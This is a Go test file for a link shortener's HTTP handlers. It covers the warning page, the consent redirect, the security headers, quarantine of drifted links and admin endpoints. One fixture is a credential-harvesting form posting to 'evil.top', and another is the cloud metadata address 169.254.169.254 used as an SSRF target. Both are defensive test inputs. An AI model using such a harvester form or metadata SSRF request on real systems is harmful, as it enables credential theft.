package httpapi

import (
	"context"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"shortlink/internal/artifact"
	"shortlink/internal/audit"
	"shortlink/internal/htmlx"
	"shortlink/internal/model"
	"shortlink/internal/netutil"
	"shortlink/internal/risk"
	"shortlink/internal/service"
	"shortlink/internal/store"
)

func newTestServer(t *testing.T, pages map[string]string) (*Server, *service.Service) {
	t.Helper()
	mem := store.NewMemory()
	allow := risk.NewAllowlist([]risk.Domain{{Pattern: "partner.com", Owner: "P"}})
	sc := risk.NewScorer(allow)
	seals, _ := service.RandomSealKey()
	svc := service.New(service.Config{SelfHosts: []string{"s.test"}, ShortBaseURL: "https://s.test"},
		mem, sc, allow, seals, audit.New())
	svc.SetFetcher(
		func(_ context.Context, raw string) (*service.ProbeResult, error) {
			b, ok := pages[raw]
			if !ok {
				return &service.ProbeResult{FinalURL: raw, StatusCode: 404, Body: []byte("nope")}, nil
			}
			return &service.ProbeResult{FinalURL: raw, StatusCode: 200, Body: []byte(b), TLSValid: true}, nil
		},
		func(raw string, res *service.ProbeResult) *artifact.Fingerprint {
			u, _ := url.Parse(raw)
			doc, _ := htmlx.Parse(res.Body, u)
			h := netutil.HostOf(res.FinalURL)
			f := &artifact.Fingerprint{FinalURL: res.FinalURL, Host: h, Registrable: netutil.Registrable(h),
				Title: doc.Title, TLSValid: res.TLSValid}
			for _, fm := range doc.Forms {
				f.FormActions = append(f.FormActions, fm.Action)
				if fh := netutil.HostOf(fm.Action); fh != "" {
					f.FormActionHosts = append(f.FormActionHosts, fh)
				}
				if fm.HasPassword {
					f.HasPassword = true
					f.PasswordForms++
				}
			}
			artifact.Stamp(f)
			return f
		},
	)
	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	return New(svc, logger), svc
}

func get(t *testing.T, h http.Handler, path string, hdr map[string]string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodGet, path, nil)
	for k, v := range hdr {
		req.Header.Set(k, v)
	}
	rr := httptest.NewRecorder()
	h.ServeHTTP(rr, req)
	return rr
}

func TestInterstitialRenderedThenConsent(t *testing.T) {
	pages := map[string]string{
		"https://promo.partner.com/x": `<html><title>Promo</title><body>hello</body></html>`,
	}
	srv, svc := newTestServer(t, pages)
	h := srv.PublicHandler()

	now := time.Now()
	svc.SetAllowlist(risk.NewAllowlist([]risk.Domain{{Pattern: "partner.com"}}))
	_ = now
	r, err := svc.Create(context.Background(), service.CreateRequest{
		Target: "https://promo.partner.com/x", Creator: model.Creator{ID: "u1"},
	})
	if err != nil {
		t.Fatal(err)
	}

	rr := get(t, h, "/"+r.Link.Code, nil)
	if rr.Code != 200 {
		t.Fatalf("status %d", rr.Code)
	}
	body := rr.Body.String()
	if !strings.Contains(body, "外部网站") {
		t.Fatal("interstitial text missing")
	}
	if !strings.Contains(body, "promo.partner.com") {
		t.Fatal("interstitial must show the destination host")
	}
	if got := rr.Header().Get("X-Frame-Options"); got != "DENY" {
		t.Fatalf("framing not blocked: %q", got)
	}
	if got := rr.Header().Get("Referrer-Policy"); got != "no-referrer" {
		t.Fatalf("referrer policy: %q", got)
	}
	if csp := rr.Header().Get("Content-Security-Policy"); !strings.Contains(csp, "frame-ancestors 'none'") {
		t.Fatalf("csp missing frame-ancestors: %q", csp)
	}

	// Extract the consent token from the rendered link and follow it.
	tok := extractToken(body)
	if tok == "" {
		t.Fatal("no consent token in page")
	}
	rr = get(t, h, "/"+r.Link.Code+"/go?t="+url.QueryEscape(tok), nil)
	if rr.Code != http.StatusFound {
		t.Fatalf("consent status %d", rr.Code)
	}
	if loc := rr.Header().Get("Location"); loc != "https://promo.partner.com/x" {
		t.Fatalf("redirect to %q", loc)
	}
}

func TestBlockedAfterDrift(t *testing.T) {
	pages := map[string]string{
		"https://p.partner.com/x": `<html><body>ok</body></html>`,
	}
	srv, svc := newTestServer(t, pages)
	h := srv.PublicHandler()

	r, _ := svc.Create(context.Background(), service.CreateRequest{
		Target: "https://p.partner.com/x", Creator: model.Creator{ID: "u1"},
	})
	if _, err := svc.ScanLink(context.Background(), r.Link.ID); err != nil {
		t.Fatal(err)
	}
	// Swap to a harvester.
	pages["https://p.partner.com/x"] = `<html><body><form action="https://evil.top/x"><input type="password" name="p"></form></body></html>`
	if _, err := svc.ScanLink(context.Background(), r.Link.ID); err != nil {
		t.Fatal(err)
	}
	rr := get(t, h, "/"+r.Link.Code, nil)
	if rr.Code != http.StatusGone {
		t.Fatalf("expected 410 for quarantined link, got %d", rr.Code)
	}
	if !strings.Contains(rr.Body.String(), "拦截") {
		t.Fatalf("blocked page missing: %s", rr.Body.String())
	}
}

func TestUnknownCode404(t *testing.T) {
	srv, _ := newTestServer(t, nil)
	rr := get(t, srv.PublicHandler(), "/zzzzzzz", nil)
	if rr.Code != http.StatusNotFound {
		t.Fatalf("got %d", rr.Code)
	}
}

func TestCreateRefusesDangerousTarget(t *testing.T) {
	srv, _ := newTestServer(t, nil)
	body := `{"target":"http://169.254.169.254/","creator_id":"u1"}`
	req := httptest.NewRequest(http.MethodPost, "/api/links", strings.NewReader(body))
	rr := httptest.NewRecorder()
	srv.AdminHandler().ServeHTTP(rr, req)
	if rr.Code != 422 {
		t.Fatalf("expected 422, got %d: %s", rr.Code, rr.Body.String())
	}
}

func TestAdminCreateAndList(t *testing.T) {
	srv, _ := newTestServer(t, map[string]string{
		"https://promo.partner.com/x": `<html><body>ok</body></html>`,
	})
	body := `{"target":"https://promo.partner.com/x","creator_id":"u1","creator_name":"M","campaign":"c1"}`
	req := httptest.NewRequest(http.MethodPost, "/api/links", strings.NewReader(body))
	rr := httptest.NewRecorder()
	srv.AdminHandler().ServeHTTP(rr, req)
	if rr.Code != 201 {
		t.Fatalf("create: %d %s", rr.Code, rr.Body.String())
	}
	if !strings.Contains(rr.Body.String(), `"short_url":"https://s.test/`) {
		t.Fatalf("short url missing: %s", rr.Body.String())
	}

	rr = get(t, srv.AdminHandler(), "/api/links?creator_id=u1", nil)
	if rr.Code != 200 || !strings.Contains(rr.Body.String(), `"total":1`) {
		t.Fatalf("list: %d %s", rr.Code, rr.Body.String())
	}
}

func extractToken(html string) string {
	const marker = "/go?t="
	i := strings.Index(html, marker)
	if i < 0 {
		return ""
	}
	rest := html[i+len(marker):]
	if j := strings.IndexAny(rest, `"'&`); j >= 0 {
		rest = rest[:j]
	}
	// html/template escapes nothing in a URL query value, but be safe.
	if dec, err := url.QueryUnescape(rest); err == nil {
		return dec
	}
	return rest
}
